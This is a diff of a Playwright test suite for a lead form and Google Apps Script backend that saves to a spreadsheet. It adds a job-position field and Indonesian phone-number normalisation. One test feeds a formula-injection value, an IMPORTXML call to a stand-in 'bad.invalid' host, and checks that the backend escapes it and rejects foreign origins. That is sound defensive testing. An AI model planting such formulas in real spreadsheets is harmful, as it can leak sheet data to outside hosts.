@@ -92,7 +92,7 @@ class LeadFlowTests(unittest.TestCase):
         self.page.locator('#download-pdf').click(); self.assertTrue(self.page.locator('#lead-dialog').evaluate('(d)=>d.open'))
 
     def fill_form(self):
-        values={'name':'Alya Pratama','email':'alya@example.co.id','company':'PT Contoh Nusantara','phone':'+62 812-3456-7890'}
+        values={'name':'Alya Pratama','email':'alya@example.co.id','company':'PT Contoh Nusantara','position':'Manajer Maintenance','phone':'0817 2233 4455'}
         for key,value in values.items(): self.page.locator(f'#simulator-lead-form [name="{key}"]').fill(value)
         self.page.locator('[name="consent"]').check(); return values
 
@@ -101,7 +101,18 @@ class LeadFlowTests(unittest.TestCase):
         return self.page.evaluate('''({source,templateSource,params,existingRows,sheetId})=>{
           const rows=structuredClone(existingRows);let released=false;
           const tmpl=html=>({payload:'',targetOrigin:'',evaluate(){const rendered=html.replace('<?!= payload ?>',this.payload).replace('<?!= targetOrigin ?>',this.targetOrigin);return{html:rendered,setXFrameOptionsMode(){return this;}};}});
-          const sheet={getLastRow:()=>rows.length,getRange:()=>({setValues:v=>rows.push(...v),createTextFinder:v=>({matchEntireCell:()=>({findNext:()=>rows.slice(1).some(r=>r[13]===v)?{}:null})})}),appendRow:r=>rows.push(r)};
+          const sheet={
+            getLastColumn:()=>Math.max(0,...rows.map(row=>row.length)),
+            getLastRow:()=>rows.length,
+            insertColumnBefore:(column)=>rows.forEach(row=>row.splice(column-1,0,'')),
+
+            getRange:(row,column,count=1,width=1)=>({
+              getValues:()=>rows.slice(row-1,row-1+count).map(values=>Array.from({length:width},(_,index)=>values[column-1+index]??'')),
+              setValues:values=>values.forEach((valuesRow,index)=>{rows[row-1+index]=rows[row-1+index]||[];rows[row-1+index].splice(column-1,valuesRow.length,...valuesRow);}),
+              createTextFinder:value=>({matchEntireCell:()=>({findNext:()=>rows.slice(1).some(values=>values[rows[0].length-1]===value)?{}:null})})
+            }),
+            appendRow:row=>rows.push(row)
+          };
           window.HtmlService={XFrameOptionsMode:{ALLOWALL:'ALLOWALL'},createHtmlOutput:html=>({html}),createTemplateFromFile:()=>tmpl(templateSource)};
           window.PropertiesService={getScriptProperties:()=>({getProperty:()=>sheetId})};window.LockService={getScriptLock:()=>({waitLock(){},hasLock:()=>true,releaseLock:()=>{released=true;}})};window.SpreadsheetApp={openById:()=>({getSheetByName:()=>sheet,insertSheet:()=>sheet})};window.console={error(){}};
           const output=new Function('e',`${source}\\nreturn doPost(e);`)({parameter:params});if(!output.html.includes('postMessage'))return{result:null,rows,released};
@@ -114,9 +125,14 @@ class LeadFlowTests(unittest.TestCase):
 
     def test_successful_save_downloads_pdf_and_opens_whatsapp(self):
         self.open_form();values=self.fill_form()
+        self.assertEqual(self.page.locator('.lead-phone-field > span').inner_text(), '+62')
+        self.assertEqual(self.page.locator('[name="phone"]').input_value(), '81722334455')
         with self.page.expect_download() as info:self.page.locator('#lead-submit').click()
         self.assertTrue(info.value.suggested_filename.endswith('.pdf'));self.assertEqual(LeadFlowHandler.payload['annual_loss'],['540000000'])
-        for key,value in values.items():self.assertEqual(LeadFlowHandler.payload[key],[value])
+        for key,value in values.items():
+            if key == 'phone': self.assertEqual(LeadFlowHandler.payload[key], ['6281722334455'])
+            else: self.assertEqual(LeadFlowHandler.payload[key],[value])
+        self.assertEqual(LeadFlowHandler.payload['position'], ['Manajer Maintenance'])
         with self.page.expect_popup() as popup:self.page.locator('#share-whatsapp').click()
         message=parse_qs(urlparse(popup.value.url).query)['text'][0];self.assertIn(values['name'],message);self.assertIn('lampirkan pdf',message.lower())
 
@@ -129,14 +145,36 @@ class LeadFlowTests(unittest.TestCase):
         error=self.page.locator('#lead-error');error.wait_for(state='visible');self.assertIn('belum dikonfigurasi',error.inner_text().lower());self.assertFalse(self.page.locator('#lead-next-step').is_visible())
 
     def test_apps_script_saves_once_escapes_formula_and_restricts_origin(self):
-        params={'request_id':'req-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'=IMPORTXML("https://bad.invalid","//a")','email':'a@b.co','company':'PT A','phone':'0812','consent':'yes','downtime':'12','downtime_cost_per_hour':'2500000','reactive_repair_cost_monthly':'15000000','breakdown_reduction_target':'30','annual_loss':'540000000','annual_saving':'162000000'}
-        saved=self.run_apps_script(params);self.assertEqual(saved['result']['status'],'success');self.assertEqual(json.loads(saved['origin']),'https://pippoauliaa-dev.github.io');self.assertEqual(saved['rows'][1][1],"'=IMPORTXML(\"https://bad.invalid\",\"//a\")");self.assertTrue(saved['released'])
+        params={'request_id':'req-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'=IMPORTXML("https://bad.invalid","//a")','email':'a@b.co','company':'PT A','position':'Manajer','phone':'0812','consent':'yes','downtime':'12','downtime_cost_per_hour':'2500000','reactive_repair_cost_monthly':'15000000','breakdown_reduction_target':'30','annual_loss':'540000000','annual_saving':'162000000'}
+        saved=self.run_apps_script(params);self.assertEqual(saved['result']['status'],'success');self.assertEqual(json.loads(saved['origin']),'https://pippoauliaa-dev.github.io');self.assertEqual(saved['rows'][1][1],"'=IMPORTXML(\"https://bad.invalid\",\"//a\")");self.assertEqual(saved['rows'][1][4],'Manajer');self.assertEqual(saved['rows'][1][5],'62812');self.assertEqual(saved['rows'][0][4],'Jabatan');self.assertEqual(saved['rows'][0][5],'WhatsApp');self.assertTrue(saved['released'])
         duplicate=self.run_apps_script(params,saved['rows']);self.assertEqual(len(duplicate['rows']),2)
         params['source']='https://bad.invalid';invalid=self.run_apps_script(params);self.assertIsNone(invalid['result']);self.assertEqual(invalid['rows'],[])
 
+    def test_apps_script_adds_position_before_phone_without_losing_existing_values(self):
+        headers=['Timestamp','Nama','Email perusahaan','Perusahaan','WhatsApp','Persetujuan','Downtime per bulan (jam)','Biaya downtime per jam (Rp)','Biaya perbaikan reaktif per bulan (Rp)','Target pengurangan breakdown (%)','Estimasi kerugian tahunan (Rp)','Potensi penghematan simulasi per tahun (Rp)','Source','Request ID']
+        existing=[headers,['2026-09-29','Nama','a@b.co','PT A','0817 2233 4455','Ya',12,2500000,15000000,30,540000000,162000000,'https://pippoauliaa-dev.github.io','existing-id'],['2026-09-29','Tanpa nomor','empty@b.co','PT Kosong','','Ya',0,0,0,30,0,0,'https://pippoauliaa-dev.github.io','empty-phone-id']]
+        params={'request_id':'req-new','attempt_id':'try-new','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'New','email':'new@b.co','company':'PT B','position':'Supervisor','phone':'0812','consent':'yes'}
+        result=self.run_apps_script(params,existing_rows=existing)
+        self.assertEqual(result['rows'][0][4],'Jabatan')
+        self.assertEqual(result['rows'][0][5],'WhatsApp')
+        self.assertEqual(result['rows'][1][4],'')
+        self.assertEqual(result['rows'][1][5],'6281722334455')
+        self.assertEqual(result['rows'][1][-1],'existing-id')
+        self.assertEqual(result['rows'][2][5],'')
+        self.assertEqual(result['rows'][2][-1],'empty-phone-id')
+        self.assertEqual(result['rows'][3][4],'Supervisor')
+        self.assertEqual(result['rows'][3][5],'62812')
+
     def test_apps_script_honeypot_discards_bot(self):
-        params={'request_id':'bot-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'Bot','email':'bot@b.co','company':'Bot','phone':'0812','consent':'yes','website':'filled'}
+        params={'request_id':'bot-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'Bot','email':'bot@b.co','company':'Bot','position':'Ops','phone':'62812','consent':'yes','website':'filled'}
         result=self.run_apps_script(params);self.assertEqual(result['result']['status'],'success');self.assertEqual(result['rows'],[])
+
+    def test_phone_normalization_supports_local_international_and_prefix(self):
+        self.page.locator('#download-pdf').click()
+        phone=self.page.locator('[name="phone"]')
+        phone.fill('0817 2233 4455');self.assertEqual(phone.input_value(),'81722334455')
+        phone.fill('+62 817-2233-4455');self.assertEqual(phone.input_value(),'81722334455')
+        phone.fill('0062 81722334455');self.assertEqual(phone.input_value(),'81722334455')
 
 
 if __name__=='__main__':unittest.main()
